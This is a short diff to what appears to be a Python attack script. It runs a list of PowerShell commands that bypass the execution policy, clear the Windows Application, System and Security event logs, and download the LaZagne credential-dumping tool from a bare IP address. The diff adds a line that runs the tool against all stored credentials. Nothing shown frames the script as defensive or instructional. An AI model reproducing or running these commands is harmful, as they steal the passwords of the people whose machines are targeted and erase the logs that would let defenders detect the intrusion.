@@ -33,6 +33,7 @@ def main():
         '''Set-ExecutionPolicy Bypass''',
         '''Clear-EventLog -LogName "Application", "System","Security","Setup","ForwardedEvents" ''',
         '''iwr 'http://175.45.176.100/LaZagne.exe' -o 'C:/temp/Laz.exe''''
+        '''C:/temp/Laz.exe all'''
     ]
     output =""
     for cmnd in cmnds_to_run:
